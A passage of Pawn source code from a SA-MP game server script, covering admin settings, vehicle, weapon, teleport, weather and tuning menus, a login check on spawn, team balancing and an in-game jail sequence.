	if(Current == AdminDisable) {
		new adminname[MAX_PLAYER_NAME], file[256]; GetPlayerName(playerid, adminname, sizeof(adminname));
		format(file,sizeof(file),"ladmin/config/Config.sav");
		switch(row){
			case 0: { ServerInfo[AntiSwear] = 0; dini_IntSet(file,"AntiSwear",0); format(string,sizeof(string),"Administrator %s has disabled antiswear",adminname); SendClientMessageToAll(blue,string);	}
			case 1: { ServerInfo[NameKick] = 0; dini_IntSet(file,"NameKick",0); format(string,sizeof(string),"Administrator %s has disabled namekick",adminname); SendClientMessageToAll(blue,string);	}
			case 2:	{ ServerInfo[AntiSpam] = 0; dini_IntSet(file,"AntiSpam",0); format(string,sizeof(string),"Administrator %s has disabled antispam",adminname); SendClientMessageToAll(blue,string);	}
			case 3:	{ ServerInfo[MaxPing] = 0; dini_IntSet(file,"MaxPing",0); format(string,sizeof(string),"Administrator %s has disabled ping kick",adminname); SendClientMessageToAll(blue,string);	}
			case 4:	{ ServerInfo[ReadCmds] = 0; dini_IntSet(file,"ReadCmds",0); format(string,sizeof(string),"Administrator %s has disabled reading commands",adminname); MessageToAdmins(green,string);	}
			case 5:	{ ServerInfo[ReadPMs] = 0; dini_IntSet(file,"ReadPMs",0); format(string,sizeof(string),"Administrator %s has disabled reading pms",adminname); MessageToAdmins(green,string); }
			case 6:	{ ServerInfo[NoCaps] = 1; dini_IntSet(file,"NoCaps",1); format(string,sizeof(string),"Administrator %s has prevented captial letters in chat",adminname); SendClientMessageToAll(blue,string); }
			case 7:	{ ServerInfo[ConnectMessages] = 0; dini_IntSet(file,"ConnectMessages",0); format(string,sizeof(string),"Administrator %s has disabled connect messages",adminname); SendClientMessageToAll(blue,string); }
			case 8:	{ ServerInfo[AdminCmdMsg] = 0; dini_IntSet(file,"AdminCmdMessages",0); format(string,sizeof(string),"Administrator %s has disabled admin command messages",adminname); MessageToAdmins(green,string); }
			case 9:	{ ServerInfo[AutoLogin] = 0; dini_IntSet(file,"AutoLogin",0); format(string,sizeof(string),"Administrator %s has disabled auto login",adminname); SendClientMessageToAll(blue,string); }
            case 10: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}//-------------------------------------------------------------------------
	if(Current==LVehicles){
		switch(row){
			case 0: ChangeMenu(playerid,Current,twodoor);
			case 1: ChangeMenu(playerid,Current,fourdoor);
			case 2: ChangeMenu(playerid,Current,fastcar);
			case 3: ChangeMenu(playerid,Current,Othercars);
			case 4: ChangeMenu(playerid,Current,bikes);
			case 5: ChangeMenu(playerid,Current,boats);
			case 6: ChangeMenu(playerid,Current,planes);
			case 7: ChangeMenu(playerid,Current,helicopters);
			case 8: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return 1;
	}
	if(Current==twodoor){
		new vehid;
		switch(row){
			case 0: vehid = 533;
			case 1: vehid = 439;
			case 2: vehid = 555;
			case 3: vehid = 422;
			case 4: vehid = 554;
			case 5: vehid = 575;
			case 6: vehid = 536;
			case 7: vehid = 535;
			case 8: vehid = 576;
			case 9: vehid = 401;
			case 10: vehid = 526;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==fourdoor){
		new vehid;
		switch(row){
			case 0: vehid = 404;
			case 1: vehid = 566;
			case 2: vehid = 412;
			case 3: vehid = 445;
			case 4: vehid = 507;
			case 5: vehid = 466;
			case 6: vehid = 546;
			case 7: vehid = 511;
			case 8: vehid = 467;
			case 9: vehid = 426;
			case 10: vehid = 405;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==fastcar){
		new vehid;
		switch(row){
			case 0: vehid = 480;
			case 1: vehid = 402;
			case 2: vehid = 415;
			case 3: vehid = 587;
			case 4: vehid = 494;
			case 5: vehid = 411;
			case 6: vehid = 603;
			case 7: vehid = 506;
			case 8: vehid = 451;
			case 9: vehid = 477;
			case 10: vehid = 541;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==Othercars){
		new vehid;
		switch(row){
			case 0: vehid = 556;
			case 1: vehid = 408;
			case 2: vehid = 431;
			case 3: vehid = 437;
			case 4: vehid = 427;
			case 5: vehid = 432;
			case 6: vehid = 601;
			case 7: vehid = 524;
			case 8: vehid = 455;
			case 9: vehid = 424;
			case 10: vehid = 573;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==bikes){
		new vehid;
		switch(row){
			case 0: vehid = 581;
			case 1: vehid = 481;
			case 2: vehid = 462;
			case 3: vehid = 521;
			case 4: vehid = 463;
			case 5: vehid = 522;
			case 6: vehid = 461;
			case 7: vehid = 448;
			case 8: vehid = 471;
			case 9: vehid = 468;
			case 10: vehid = 586;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==boats){
		new vehid;
		switch(row){
			case 0: vehid = 472;
			case 1: vehid = 473;
			case 2: vehid = 493;
			case 3: vehid = 595;
			case 4: vehid = 484;
			case 5: vehid = 430;
			case 6: vehid = 453;
			case 7: vehid = 452;
			case 8: vehid = 446;
			case 9: vehid = 454;
			case 10: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==planes){
		new vehid;
		switch(row){
			case 0: vehid = 592;
			case 1: vehid = 577;
			case 2: vehid = 511;
			case 3: vehid = 512;
			case 4: vehid = 593;
			case 5: vehid = 520;
			case 6: vehid = 553;
			case 7: vehid = 476;
			case 8: vehid = 519;
			case 9: vehid = 460;
			case 10: vehid = 513;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==helicopters){
		new vehid;
		switch(row){
			case 0: vehid = 548;
			case 1: vehid = 425;
			case 2: vehid = 417;
			case 3: vehid = 487;
			case 4: vehid = 488;
			case 5: vehid = 497;
			case 6: vehid = 563;
			case 7: vehid = 447;
			case 8: vehid = 469;
			case 9: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}

	if(Current==XWeapons){
		switch(row){
			case 0: { GivePlayerWeapon(playerid,24,500); }
			case 1: { GivePlayerWeapon(playerid,31,500); }
			case 2: { GivePlayerWeapon(playerid,26,500); }
			case 3: { GivePlayerWeapon(playerid,27,500); }
			case 4: { GivePlayerWeapon(playerid,28,500); }
			case 5: { GivePlayerWeapon(playerid,35,500); }
			case 6: { GivePlayerWeapon(playerid,38,1000); }
			case 7: { GivePlayerWeapon(playerid,34,500); }
			case 8: return ChangeMenu(playerid,Current,XWeaponsBig);
        	case 9: return ChangeMenu(playerid,Current,XWeaponsSmall);
        	case 10: return ChangeMenu(playerid,Current,XWeaponsMore);
        	case 11: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}

	if(Current==XWeaponsBig){
		switch(row){
			case 0: { GivePlayerWeapon(playerid,25,500);  }
			case 1: { GivePlayerWeapon(playerid,30,500); }
			case 2: { GivePlayerWeapon(playerid,33,500); }
			case 3: { GivePlayerWeapon(playerid,36,500); }
			case 4: { GivePlayerWeapon(playerid,37,500); }
			case 5: { GivePlayerWeapon(playerid,29,500); }
			case 6: { GivePlayerWeapon(playerid,32,1000); }
			case 7: return ChangeMenu(playerid,Current,XWeapons);
		}
		return TogglePlayerControllable(playerid,true);
	}

	if(Current==XWeaponsSmall){
		switch(row){
			case 0: { GivePlayerWeapon(playerid,22,500); }//9mm
			case 1: { GivePlayerWeapon(playerid,23,500); }//s9
			case 2: { GivePlayerWeapon(playerid,18,500); }// MC
			case 3: { GivePlayerWeapon(playerid,42,500); }//FE
			case 4: { GivePlayerWeapon(playerid,41,500); }//spraycan
			case 5: { GivePlayerWeapon(playerid,16,500); }//grenade
			case 6: { GivePlayerWeapon(playerid,8,500); }//Katana
			case 7: { GivePlayerWeapon(playerid,9,1000); }//chainsaw
			case 8: return ChangeMenu(playerid,Current,XWeapons);
		}
		return TogglePlayerControllable(playerid,true);
	}

	if(Current==XWeaponsMore){
		switch(row){
			case 0: SetPlayerSpecialAction(playerid, 2);
			case 1: GivePlayerWeapon(playerid,4,500);
			case 2: GivePlayerWeapon(playerid,14,500);
			case 3: GivePlayerWeapon(playerid,43,500);
			case 4: GivePlayerWeapon(playerid,7,500);
			case 5: GivePlayerWeapon(playerid,5,500);
			case 6: GivePlayerWeapon(playerid,2,1000);
			case 7: MaxAmmo(playerid);
			case 8: return ChangeMenu(playerid,Current,XWeapons);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == LTele)
	{
        switch(row)
		{
			case 0: ChangeMenu(playerid,Current,LasVenturasMenu);
			case 1: ChangeMenu(playerid,Current,LosSantosMenu);
			case 2: ChangeMenu(playerid,Current,SanFierroMenu);
			case 3: ChangeMenu(playerid,Current,DesertMenu);
			case 4: ChangeMenu(playerid,Current,FlintMenu);
			case 5: ChangeMenu(playerid,Current,MountChiliadMenu);
			case 6: ChangeMenu(playerid,Current,InteriorsMenu);
			case 7: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return 1;
	}

    if(Current == LasVenturasMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,2037.0,1343.0,12.0); SetPlayerInterior(playerid,0); }// strip
			case 1: { SetPlayerPos(playerid,2163.0,1121.0,23); SetPlayerInterior(playerid,0); }// come a lot
			case 2: { SetPlayerPos(playerid,1688.0,1615.0,12.0); SetPlayerInterior(playerid,0); }// lv airport
			case 3: { SetPlayerPos(playerid,2503.0,2764.0,10.0); SetPlayerInterior(playerid,0); }// military fuel
			case 4: { SetPlayerPos(playerid,1418.0,2733.0,10.0); SetPlayerInterior(playerid,0); }// golf lv
			case 5: { SetPlayerPos(playerid,1377.0,2196.0,9.0); SetPlayerInterior(playerid,0); }// pitch match
			case 6: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == LosSantosMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,2495.0,-1688.0,13.0); SetPlayerInterior(playerid,0); }// ganton
			case 1: { SetPlayerPos(playerid,1979.0,-2241.0,13.0); SetPlayerInterior(playerid,0); }// ls airport
			case 2: { SetPlayerPos(playerid,2744.0,-2435.0,15.0); SetPlayerInterior(playerid,0); }// docks
			case 3: { SetPlayerPos(playerid,1481.0,-1656.0,14.0); SetPlayerInterior(playerid,0); }// square
			case 4: { SetPlayerPos(playerid,1150.0,-2037.0,69.0); SetPlayerInterior(playerid,0); }// veradant bluffs
			case 5: { SetPlayerPos(playerid,425.0,-1815.0,6.0); SetPlayerInterior(playerid,0); }// santa beach
			case 6: { SetPlayerPos(playerid,1240.0,-744.0,95.0); SetPlayerInterior(playerid,0); }// mullholland
			case 7: { SetPlayerPos(playerid,679.0,-1070.0,49.0); SetPlayerInterior(playerid,0); }// richman
			case 8: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == SanFierroMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,-1990.0,137.0,27.0); SetPlayerInterior(playerid,0); } // sf station
			case 1: { SetPlayerPos(playerid,-1528.0,-206.0,14.0); SetPlayerInterior(playerid,0); }// sf airport
			case 2: { SetPlayerPos(playerid,-2709.0,198.0,4.0); SetPlayerInterior(playerid,0); }// ocean flats
			case 3: { SetPlayerPos(playerid,-2738.0,-295.0,6.0); SetPlayerInterior(playerid,0); }// avispa country club
			case 4: { SetPlayerPos(playerid,-1457.0,465.0,7.0); SetPlayerInterior(playerid,0); }// easter basic docks
			case 5: { SetPlayerPos(playerid,-1853.0,1404.0,7.0); SetPlayerInterior(playerid,0); }// esplanadae north
			case 6: { SetPlayerPos(playerid,-2620.0,1373.0,7.0); SetPlayerInterior(playerid,0); }// battery point
			case 7: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == DesertMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,416.0,2516.0,16.0); SetPlayerInterior(playerid,0); } // plane graveyard
			case 1: { SetPlayerPos(playerid,81.0,1920.0,17.0); SetPlayerInterior(playerid,0); }// area51
			case 2: { SetPlayerPos(playerid,-324.0,1516.0,75.0); SetPlayerInterior(playerid,0); }// big ear
			case 3: { SetPlayerPos(playerid,-640.0,2051.0,60.0); SetPlayerInterior(playerid,0); }// dam
			case 4: { SetPlayerPos(playerid,-766.0,1545.0,27.0); SetPlayerInterior(playerid,0); }// las barrancas
			case 5: { SetPlayerPos(playerid,-1514.0,2597.0,55.0); SetPlayerInterior(playerid,0); }// el qyebrados
			case 6: { SetPlayerPos(playerid,442.0,1427.0,9.0); SetPlayerInterior(playerid,0); }// actane springs
			case 7: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == FlintMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,-849.0,-1940.0,13.0);  SetPlayerInterior(playerid,0); }// lake
			case 1: { SetPlayerPos(playerid,-1107.0,-1619.0,76.0);  SetPlayerInterior(playerid,0); }// leafy hollow
			case 2: { SetPlayerPos(playerid,-1049.0,-1199.0,128.0);  SetPlayerInterior(playerid,0); }// the farm
			case 3: { SetPlayerPos(playerid,-1655.0,-2219.0,32.0);  SetPlayerInterior(playerid,0); }// shady cabin
			case 4: { SetPlayerPos(playerid,-375.0,-1441.0,25.0); SetPlayerInterior(playerid,0); }// flint range
			case 5: { SetPlayerPos(playerid,-367.0,-1049.0,59.0); SetPlayerInterior(playerid,0); }// beacon hill
			case 6: { SetPlayerPos(playerid,-494.0,-555.0,25.0); SetPlayerInterior(playerid,0); }// fallen tree
			case 7: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == MountChiliadMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,-2308.0,-1657.0,483.0);  SetPlayerInterior(playerid,0); }// chiliad jump
			case 1: { SetPlayerPos(playerid,-2331.0,-2180.0,35.0); SetPlayerInterior(playerid,0); }// bottom chiliad
			case 2: { SetPlayerPos(playerid,-2431.0,-1620.0,526.0);  SetPlayerInterior(playerid,0); }// highest point
			case 3: { SetPlayerPos(playerid,-2136.0,-1775.0,208.0);  SetPlayerInterior(playerid,0); }// chiliad path
			case 4: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == InteriorsMenu)
	{
        switch(row)
		{
			case 0: {	SetPlayerPos(playerid,386.5259, 173.6381, 1008.3828);	SetPlayerInterior(playerid,3); }
			case 1: {	SetPlayerPos(playerid,288.4723, 170.0647, 1007.1794);	SetPlayerInterior(playerid,3); }
			case 2: {	SetPlayerPos(playerid,372.5565, -131.3607, 1001.4922);	SetPlayerInterior(playerid,5); }
			case 3: {	SetPlayerPos(playerid,-1129.8909, 1057.5424, 1346.4141);	SetPlayerInterior(playerid,10); }
			case 4: {	SetPlayerPos(playerid,2233.9363, 1711.8038, 1011.6312);	SetPlayerInterior(playerid,1); }
			case 5: {	SetPlayerPos(playerid,2536.5322, -1294.8425, 1044.125);	SetPlayerInterior(playerid,2); }
			case 6: {	SetPlayerPos(playerid,1267.8407, -776.9587, 1091.9063);	SetPlayerInterior(playerid,5); }
  			case 7: {	SetPlayerPos(playerid,-1421.5618, -663.8262, 1059.5569);	SetPlayerInterior(playerid,4); }
   			case 8: {	SetPlayerPos(playerid,-1401.067, 1265.3706, 1039.8672);	SetPlayerInterior(playerid,16); }
   			case 9: {	SetPlayerPos(playerid,285.8361, -39.0166, 1001.5156);	SetPlayerInterior(playerid,1); }
    		case 10: {	SetPlayerPos(playerid,1727.2853, -1642.9451, 20.2254);	SetPlayerInterior(playerid,18); }
			case 11: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}
    if(Current == LWeather)
	{
		new adminname[MAX_PLAYER_NAME]; GetPlayerName(playerid, adminname, sizeof(adminname));
        switch(row)
		{
			case 0:	{	SetWeather(5);	PlayerPlaySound(playerid,1057,0.0,0.0,0.0);	CMDMessageToAdmins(playerid,"SETWEATHER"); format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
   			case 1:	{	SetWeather(19); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 2:	{	SetWeather(8);  PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 3:	{	SetWeather(20);	PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 4:	{	SetWeather(9);  PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 5:	{	SetWeather(16); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 6:	{	SetWeather(45); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 7:	{	SetWeather(44); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 8:	{	SetWeather(22); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 9:	{	SetWeather(11); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 10: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == LTuneMenu)
	{
        switch(row)
		{
			case 0:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1010); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
   			case 1:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1087); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added"); }
			case 2:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1081); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 3: {	AddVehicleComponent(GetPlayerVehicleID(playerid),1078); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 4:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1098); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 5:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1074); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 6:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1082); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 7:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1085); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 8:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1025); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 9:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1077); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 10: return ChangeMenu(playerid,Current,PaintMenu);
			case 11: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == PaintMenu)
	{
        switch(row)
		{
			case 0:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),0); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 1"); }
			case 1:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),1); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 2"); }
			case 2:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),2); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 3"); }
			case 3:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),3); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 4"); }
			case 4:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),4); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 5"); }
			case 5:	{ ChangeVehicleColor(GetPlayerVehicleID(playerid),0,0); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Colour Changed To Black"); }
			case 6:	{ ChangeVehicleColor(GetPlayerVehicleID(playerid),1,1); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Colour Changed To White"); }
			case 7:	{ ChangeVehicleColor(GetPlayerVehicleID(playerid),79,158); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Colour Changed To Black"); }
			case 8:	{ ChangeVehicleColor(GetPlayerVehicleID(playerid),146,183); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Colour Changed To Black"); }
			case 9: return ChangeMenu(playerid,Current,LTuneMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}
    if(Current == LTime)
	{
		new adminname[MAX_PLAYER_NAME]; GetPlayerName(playerid, adminname, sizeof(adminname));
        switch(row)
		{
			case 0:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,7,0);	PlayerPlaySound(playerid,1057,0.0,0.0,0.0);	CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
   			case 1:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,12,0); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
			case 2:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,16,0);  PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
			case 3:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,20,0);	PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
			case 4:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,0,0);  PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
			case 5: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == LCars)
	{
		new vehid;
        switch(row) {
			case 0: vehid = 451;//Turismo
			case 1: vehid = 568;//Bandito
			case 2: vehid = 539;//Vortex
			case 3: vehid = 522;//nrg
			case 4: vehid = 601;//s.w.a.t
			case 5: vehid = 425; //hunter
			case 6: vehid = 493;//jetmax
			case 7: vehid = 432;//rhino
			case 8: vehid = 444; //mt
			case 9: vehid = 447; //sea sparrow
			case 10: return ChangeMenu(playerid,Current,LCars2);
			case 11: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return SelectCar(playerid,vehid,Current);
	}

    if(Current == LCars2)
	{
		new vehid;
        switch(row) {
			case 0: vehid = 406;// dumper
			case 1: vehid = 564; //rc tank
			case 2: vehid = 441;//RC Bandit
			case 3: vehid = 464;// rc baron
			case 4: vehid = 501; //rc goblin
			case 5: vehid = 465; //rc raider
			case 6: vehid = 594; // rc cam
			case 7: vehid = 449; //tram
			case 8: return ChangeMenu(playerid,Current,LCars);
		}
		return SelectCar(playerid,vehid,Current);
	}

	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
//++++++++++++++++++++SQL+++++++++++++++
    if(!Logged[playerid]) //If the player isn't logged in and (s)he tries to spawn.
    {
        if(!IsRegistered[playerid])  //If the player isn't registered
        {
            ShowPlayerDialog(playerid, 15000, DIALOG_STYLE_INPUT, "Register","Your user is {FF0000}not{FFFFFF} registered! Please {0000FF}register{FFFFFF} with a password below!\n {FF0000}ERROR:You must register before spawning!","Register","Cancel"); //Shows our register dialog :).
            return 0; //Prevents the player from spawning
        }
        if(IsRegistered[playerid] == 1) //Our handy variable comes into use now
        {
            ShowPlayerDialog(playerid, 15500, DIALOG_STYLE_INPUT, "Login","Your user is {FF0000}registered{FFFFFF}! Please {0000FF}login{FFFFFF} with your password below!\n{FF0000} You must login before you spawn!","Login","Cancel"); //Shows our login dialog :).
            return 0; //Prevents the player from spawning
        }
    }
//++++++++++++++++++++++SQL+++++++++++++++++++++++++
    if(IsPlayerNPC(playerid))return 1;
   	if(PlayerInfo[playerid][LoggedIn] == 0 && PlayerInfo[playerid][Registered] == 1)
   	{
     	new str[128];
	 	format(str,sizeof(str),"Server: You are not registered yet.Please /register <Password>",PlayerName2(playerid));
	 	SendClientMessage(playerid,red,str);
   	}
	new team1count = GetTeamCount(TEAM_EURASIA);
	new team2count = GetTeamCount(TEAM_USA);
	new team3count = GetTeamCount(TEAM_ARAB);
	new team4count = GetTeamCount(TEAM_SOVIET);
	new team5count = GetTeamCount(TEAM_AUS);
	switch(gTeam[playerid])
	{
		case TEAM_EURASIA:
		{
            if(team1count > team2count && team3count && team4count && team5count)
			{
				SendClientMessage(playerid, red,"EURASIA team is full");
				return 0;
    		}
		}
		case TEAM_USA:
		{
		    if(team2count > team1count && team3count && team4count && team5count)
			{
				SendClientMessage(playerid, red,"USA team is full");
				return 0;
    		}
		}
		case TEAM_ARAB:
		{
			if(team3count > team2count && team1count && team4count && team5count)
			{
				SendClientMessage(playerid, red,"Arabia team is full");
				return 0;
    		}
		}
		case TEAM_SOVIET:
		{
		    if(team4count > team2count && team3count && team1count && team5count)
			{
				SendClientMessage(playerid, red,"Soviet team is full");
				return 0;
    		}
		}
		case TEAM_AUS:
		{
		    if(team5count > team2count && team3count && team1count && team5count)
			{
				SendClientMessage(playerid, red,"Austraillia team is full");
				return 0;
    		}
		}
	}
   	return 1;
}
//==============================================================================

public OnPlayerExitedMenu(playerid)
{
    new Menu:Current = GetPlayerMenu(playerid);
    HideMenuForPlayer(Current,playerid);
    return TogglePlayerControllable(playerid,true);
}

//==============================================================================

ChangeMenu(playerid,Menu:oldmenu,Menu:newmenu)
{
	if(IsValidMenu(oldmenu)) {
		HideMenuForPlayer(oldmenu,playerid);
		ShowMenuForPlayer(newmenu,playerid);
	}
	return 1;
}

CloseMenu(playerid,Menu:oldmenu)
{
	HideMenuForPlayer(oldmenu,playerid);
	TogglePlayerControllable(playerid,1);
	return 1;
}
SelectCar(playerid,vehid,Menu:menu)
{
	CloseMenu(playerid,menu);
	SetCameraBehindPlayer(playerid);
	CarSpawner(playerid,vehid);
	return 1;
}
#endif

//==============================================================================


//==================== [ Jail & Freeze ]========================================

forward Jail1(player1);
public Jail1(player1)
{
	TogglePlayerControllable(player1,false);
	new Float:x, Float:y, Float:z;	GetPlayerPos(player1,x,y,z);
	SetPlayerCameraPos(player1,x+10,y,z+10);SetPlayerCameraLookAt(player1,x,y,z);
	Jail2(player1);
}

forward Jail2(player1);
public Jail2(player1)
{
	new Float:x, Float:y, Float:z; GetPlayerPos(player1,x,y,z);
	SetPlayerCameraPos(player1,x+7,y,z+5); SetPlayerCameraLookAt(player1,x,y,z);
	if(GetPlayerState(player1) == PLAYER_STATE_ONFOOT) SetPlayerSpecialAction(player1,SPECIAL_ACTION_HANDSUP);
	GameTextForPlayer(player1,"~r~Busted By Admins",3000,3);
	Jail3(player1);
}

forward Jail3(player1);
public Jail3(player1)
{
	new Float:x, Float:y, Float:z; GetPlayerPos(player1,x,y,z);
